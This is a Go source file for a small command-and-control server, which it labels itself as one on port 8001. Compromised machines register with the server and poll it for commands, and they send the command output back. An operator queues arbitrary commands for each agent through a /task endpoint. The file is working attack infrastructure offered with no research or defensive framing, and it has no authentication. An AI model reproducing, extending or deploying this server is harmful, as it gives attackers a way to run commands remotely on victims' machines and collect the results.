package main

import (
"encoding/json"
"fmt"
"log"
"net/http"
"sync"
"time"
)

type Agent struct {
ID       string `json:"id"`
Hostname string `json:"hostname"`
OS       string `json:"os"`
LastSeen int64  `json:"last_seen"`
}

type Task struct {
ID        string `json:"id"`
AgentID   string `json:"agent_id"`
Command   string `json:"command"`
Status    string `json:"status"`
CreatedAt int64  `json:"created_at"`
}

var (
agents   = make(map[string]Agent)
tasks    = make(map[string][]Task)
taskID   = 0
agentsMu sync.Mutex
tasksMu  sync.Mutex
)

func registerHandler(w http.ResponseWriter, r *http.Request) {
if r.Method != http.MethodPost {
http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
return
}

var agent Agent
if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
http.Error(w, "Invalid request", http.StatusBadRequest)
return
}

agentsMu.Lock()
agent.LastSeen = time.Now().Unix()
agents[agent.ID] = agent
agentsMu.Unlock()

w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
}

func taskHandler(w http.ResponseWriter, r *http.Request) {
if r.Method != http.MethodPost {
http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
return
}

var req map[string]string
if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
http.Error(w, "Invalid request", http.StatusBadRequest)
return
}

agentID := req["agent_id"]

agentsMu.Lock()
_, exists := agents[agentID]
agentsMu.Unlock()
if !exists {
http.Error(w, "Agent not found", http.StatusNotFound)
return
}

// Operator kirim task
if cmd, ok := req["command"]; ok && cmd != "" {
tasksMu.Lock()
taskID++
task := Task{
ID:        fmt.Sprintf("task-%d", taskID),
AgentID:   agentID,
Command:   cmd,
Status:    "pending",
CreatedAt: time.Now().Unix(),
}
tasks[agentID] = append(tasks[agentID], task)
tasksMu.Unlock()

w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]string{"status": "task_added"})
return
}

// Agent minta task
tasksMu.Lock()
agentTasks := tasks[agentID]
var pendingTask *Task
for i := range agentTasks {
if agentTasks[i].Status == "pending" {
pendingTask = &agentTasks[i]
break
}
}
tasksMu.Unlock()

if pendingTask != nil {
tasksMu.Lock()
for i := range tasks[agentID] {
if tasks[agentID][i].ID == pendingTask.ID {
tasks[agentID][i].Status = "assigned"
break
}
}
tasksMu.Unlock()
w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]interface{}{"command": pendingTask.Command})
} else {
w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]interface{}{"command": nil})
}
}

func resultHandler(w http.ResponseWriter, r *http.Request) {
if r.Method != http.MethodPost {
http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
return
}

var result map[string]string
if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
http.Error(w, "Invalid request", http.StatusBadRequest)
return
}

fmt.Printf("[+] Result from %s: %s\n", result["agent_id"], result["output"])
w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]string{"status": "recorded"})
}

func main() {
http.HandleFunc("/register", registerHandler)
http.HandleFunc("/task", taskHandler)
http.HandleFunc("/result", resultHandler)

fmt.Println("[+] C2 server running on port 8001")
log.Fatal(http.ListenAndServe(":8001", nil))
}
